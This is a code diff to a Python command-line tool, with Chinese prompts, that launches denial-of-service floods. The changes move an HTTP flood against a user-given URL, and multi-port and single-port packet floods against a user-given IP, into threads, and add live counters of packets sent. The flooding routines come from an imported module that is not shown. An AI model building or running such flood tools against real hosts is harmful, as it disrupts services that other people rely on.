@@ -2,6 +2,7 @@ if __name__ =='__main__':
 
     import sys
     import os
+    import threading
     script_path = os.path.split(os.path.realpath(__file__))[0]
     sys.path.append(script_path)
     from moligeek import *
@@ -59,24 +60,37 @@ if __name__ =='__main__':
             except:
                 print("设置错误，默认为10")
                 speed = 10
-            network.startattack(url,speed)
-            
+            a = network.attack(url,speed)
+            t = threading.Thread(target=a.startattack, args=())
+            t.start()
+            while True:
+                print("\r已发送{}个包，失效{}个包".format(
+                a.collector['success'] + a.collector['err'],
+                a.collector['err']
+            ), end="")
     elif mainmode in ["2", "network"]:
         target_ip = input("请输入目标ip:")
-        mode = input("请选择模式:\n[1]泛洪攻击\n[2]ping\n[3]洪攻击\n")
+        mode = input("请选择模式:\n[1]泛洪攻击\n[2]洪攻击\n[3]ping\n")
 
         if mode in ["1", "泛洪攻击"]:
             meo.screen.red_font("注意！此功能极有可能耗尽你的宽带")
             port = int(input("请输入起始端口:"))
-            network.ddos_attack(target_ip,port=port)
-        if mode in ["2", "ping"]:
-            print("pinging...")
-            print(network.ping(target_ip))
-        if mode in ["3", "洪攻击"]:
+            d = network.ddos(target_ip, port = port)
+            t = threading.Thread(target=d.all, args=())
+            t.start()
+            while True:
+                print ("\r已发送 %s 个包到 %s 通过端口:%s"%(d.data['sent'],d.ip,d.data['port']),end="")
+        if mode in ["2", "洪攻击"]:
             meo.screen.red_font("注意！此功能极有可能耗尽你的宽带")
             port = int(input("请输入目标端口:"))
-            network.c_ddos_attack(target_ip,port=port)
-
+            d = network.ddos(target_ip, port = port)
+            t = threading.Thread(target=d.one, args=())
+            t.start()
+            while True:
+                print ("\r已发送 %s 个包到 %s 通过端口:%s"%(d.data['sent'],d.ip,d.port),end="")
+        if mode in ["3", "ping"]:
+            print("pinging...")
+            print(network.ping(target_ip))
     elif mainmode in ["3", "LAN"]:
         mode = input("请选择模式:\n[1]设备扫描\n")
 
